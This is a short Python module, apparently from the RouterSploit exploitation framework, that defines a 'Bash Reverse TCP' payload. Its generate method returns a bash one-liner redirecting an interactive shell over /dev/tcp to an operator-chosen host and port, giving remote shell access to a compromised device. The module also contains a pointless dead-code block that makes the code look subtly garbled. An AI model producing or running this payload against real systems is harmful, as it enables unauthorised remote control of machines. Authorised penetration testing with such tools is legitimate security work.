from routersploit.core.exploit import *
from routersploit.core.exploit.payloads import GenericPayload, ReverseTCPPayloadMixin

class Payload(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {'name': 'Bash Reverse TCP', 'description': 'Creates interactive tcp reverse shell by using bash.', 'authors': ('Marcin Bury <marcin[at]threat9.com>',)}
    cmd = OptString('bash', 'Bash binary')

    def generate(self):
        if False:
            while True:
                i = 10
        return '{} -i >& /dev/tcp/{}/{} 0>&1'.format(self.cmd, self.lhost, self.lport)